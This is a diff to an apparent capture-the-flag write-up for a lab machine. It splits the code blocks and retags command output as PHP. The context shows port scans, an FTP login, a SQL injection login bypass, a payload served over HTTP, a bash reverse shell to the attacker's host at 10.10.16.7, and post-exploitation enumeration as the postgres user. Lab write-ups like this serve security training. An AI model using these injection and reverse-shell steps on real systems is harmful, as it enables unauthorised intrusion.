@@ -25,6 +25,9 @@ tags:
 
 ```bash
 ❯ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.236
+```
+
+```php
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 10:55 CEST
 Initiating SYN Stealth Scan at 10:55
@@ -79,6 +82,9 @@ Nmap done: 1 IP address (1 host up) scanned in 44.24 seconds
 
 ```bash
 ftp 10.10.10.236
+```
+
+```php
 Connected to 10.10.10.236.
 220-FileZilla Server 0.9.60 beta
 220-written by Tim Kosse (tim.kosse@filezilla-project.org)
@@ -101,6 +107,9 @@ ftp>
 
 ```bash
 ❯ nmap -sCV -p443 10.10.10.236
+```
+
+```php
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 12:01 CEST
 Nmap scan report for admin.megalogistic.com (10.10.10.236)
 Host is up (0.048s latency).
@@ -155,6 +164,9 @@ WHERE username = 'admin''or 1=1-- AND password = md5('admin'');
 
 ```bash
 ❯ python3 -m http.server
+```
+
+```php
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.10.236 - - [04/Jun/2025 13:20:44] code 404, message File not found
 10.10.10.236 - - [04/Jun/2025 13:20:44] "GET /test HTTP/1.1" 404 -
@@ -176,12 +188,18 @@ bash -c 'bash -i >& /dev/tcp/10.10.16.7/9000 0>&1'
 
 ```bash
 ❯ python3 -m http.server
+```
+
+```php
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.10.236 - - [04/Jun/2025 13:33:52] "GET /bash.sh HTTP/1.1" 200 -
 ```
 
 ```bash
 ❯ nc -nlvp 9000
+```
+
+```php
 listening on [any] 9000 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.10.10.236] 49872
 bash: cannot set terminal process group (371): Inappropriate ioctl for device
@@ -195,13 +213,17 @@ postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
 
 ```bash
 postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ hostname -I
+```
 
+```php
 172.17.0.2 
 ```
 
 ```bash
 postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ route -n
+```
 
+```php
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
